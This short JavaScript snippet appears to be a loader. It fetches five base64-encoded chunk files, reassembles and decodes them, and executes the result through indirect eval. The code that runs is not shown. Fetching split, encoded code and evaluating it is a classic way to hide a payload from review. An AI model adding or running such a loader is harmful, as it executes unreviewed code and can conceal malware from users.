(async () => {
  const parts = await Promise.all(
    [1, 2, 3, 4, 5].map((n) => fetch("./app.p" + n + ".b64").then((r) => r.text()))
  );
  const bin = Uint8Array.from(atob(parts.join("").replace(/\s/g, "")), (c) => c.charCodeAt(0));
  const code = new TextDecoder().decode(bin);
  (0, eval)(code);
})();
